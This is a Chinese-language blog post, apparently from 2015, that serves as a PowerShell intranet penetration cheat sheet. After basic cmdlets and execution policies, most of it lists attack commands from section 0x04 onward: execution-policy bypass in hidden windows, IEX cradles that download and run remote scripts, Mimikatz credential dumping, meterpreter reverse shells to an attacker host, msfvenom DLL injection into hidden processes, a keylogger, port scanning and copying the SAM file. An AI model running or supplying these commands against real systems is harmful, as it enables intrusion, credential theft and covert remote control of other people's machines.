---
title: powershell内网渗透
date: 2015-12-25T08:52:52+08:00
update: 2016-01-01
categories: [网络安全]
tags: [powershell]
---

## 0x01 Powershell
     Powershell 启动 Powershell
     查看版本 $PSVersionTable.PSVersion
以管理员启动Powershell
 Start-Process notepad -Verb runas
 Start-Process "$PSHOME\powershell.exe" -Verb runas
具有一致的命名规范，都采用动词- 名词形式，如New-Item
动词部分一般为Add、New、Get、Remove、Set等

模块路径: $Env:PSModulePath

## 0x02 Powershell 文件操作
   以文件操作为例讲解PowerShell命令的基本用法
 新建目录 New-Item whitecellclub -ItemType Directory
 新建文件 New-Item light.txt -ItemType File
 删除目录 Remove-Item whitecellclub
 显示文本内容 Get-Content light.txt
 设置文本内容 Set-Content light.txt -Value "i love light so much"
 追加内容 Add-Content light.txt -Value "but i love you more"
 清除内容 Clear-Content light.txt

## 0x03 powershell脚本
了解计算机上的现用执行策略，键入：get-executionpolicy
 Restricted——默认的设置， 不允许任何script运行
 AllSigned——只能运行经过数字证书签名的script
 RemoteSigned——运行本地的script不需要数字签名，但是运行从网络上
下载的script就必须要有数字签名
 Unrestricted——允许所有的script运行。
若要在本地计算机上运行您编写的未签名脚本和来自其他用户的签名脚本，
请使用以下命令将计算机上的执行策略更改为 RemoteSigned：
set-executionpolicy remotesigned

## 0x04 powershell 安全
本地权限绕过执行
`PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1`
本地隐藏权限绕过执行脚本
`PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden（隐藏窗口） -File xxx.ps1`
**直接用IEX下载远程的PS1脚本回来权限绕过执行**
`powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); InvokeMimikatz -DumpCreds"`

## 0x05 powersploit 后渗透

`git clone https://github.com/PowerShellMafia/PowerSploit.git`
创建本地服务: `python -m SimpleHTTPServer`
CodeExecution 在目标主机执行代码
ScriptModification 在目标主机上创建或修改脚本
Persistence 后门脚本（持久性控制）
AntivirusBypass 发现杀软查杀特征
Exfiltration 目标主机上的信息搜集工具
Mayhem 蓝屏等破坏性脚本
Recon 以目标主机为跳板进行内网信息侦查

远程代码执行：
IEX (New-Object Net.WebClient).DownloadString(“http://<ip_address>/path/xxx.ps1”)

## 0x06
`python -m SimpleHTTPServer`
目标主机‘安装’invoke-shellcode脚本
`IEX (New-Object Net.WebClient).DownloadString("http://127.0.0.1:8000/CodeExecution/Invoke-Shellcode.ps1")`
查看帮助信息
`Get-Help Invoke-Shellcode`
2、目标主机开启反弹马：Lhost 为服务器的KALI
`Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.100.33 -Lport 4444 -Force`


一、当前进程注入meterpreter反弹马payload
1、Kali Linux开启metasploit监听：
msf > use exploit/multi/handler

msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_https
>PAYLOAD => windows/meterpreter/reverse_https

msf exploit(handler) > set LHOST 192.168.146.129
>LHOST => 192.168.146.129

msf exploit(handler) > set LPORT 4444
>LPORT => 4444

msf exploit(handler) > exploit

3、Linux成功接收，得到一个meterpreter的shell


## 0x07 进程注入
二、指定进程注入反弹马
1、Get-Process获取当前进程
也可以新建一个隐藏进
程并注入：
Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden
25 www.whitecell.club
内网渗透实例
2、注入
Invoke-Shellcode -ProcessID 1628 -Payload
windows/meterpreter/reverse_https -Lhost 192.168.146.129 -Lport 4444

## 0x08 DLL 注入
可以利用powersploit将dll文件注入到当前进程中，但是dll文件必须在目标主
机上。
1、下载安装powersploit的dll注入脚本：
IEX (New-Object
Net.WebClient).DownloadString("http://192.168.146.129/CodeExecution/Inv
oke-DllInjection.ps1")
2、用metasploit生成一个dll反弹马
msfvenom -p windows/x64/meterpreter/reverse_tcp
LHOST=192.168.146.129 LPORT=4444 -f dll > /var/www/msf.dll
3、将DLL文件传输到目标主机
3、开启一个隐藏进程并注入DLL
Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden
Invoke-DllInjection -ProcessID 2356 -Dll .\msf.dll
4、修改metasploit监听设置并启动

## 0x09 端口扫描

Invoke-Portscan端口扫描
IEX(New-Object Net.WebClient).DownloadString("http://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1")
Invoke-Portscan -Hosts 192.168.146.133,192.168.146.129 -Ports
"21,22,80,8080,1433,3389"

## 0x10 Invoke-Mimikatz 查看主机密码（需要管理员权限）
下载执行脚本：
IEX (New-Object
Net.WebClient).DownloadString("http://192.168.146.129/Exfiltration/Invoke-Mimikatz.ps1")
DUMP密码：
Invoke-Mimikatz -DumpCreds
mimikatz作者博客：
http://blog.gentilkiwi.com/mimikatz
https://github.com/gentilkiwi/mimikatz/releases/tag/2.0.0-alpha-20150906
## 0x11
键盘记录（详细的鼠标、键盘输入记录）
IEX (New-Object
Net.WebClient).DownloadString("http://192.168.146.129/Exfiltratio
n/Get-Keystrokes.ps1")
Get-Keystrokes -LogPath .\keylogger.txt
## 0x12 超级复制（需要管理员权限，可以复制受保护的运行中的系统文件）
IEX (New-Object
Net.WebClient).DownloadString("http://192.168.146.129/Exfiltration/InvokeNinjaCopy.ps1")
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SAM"
 -
LocalDestination "C:\Users\light\Desktop\SAM"
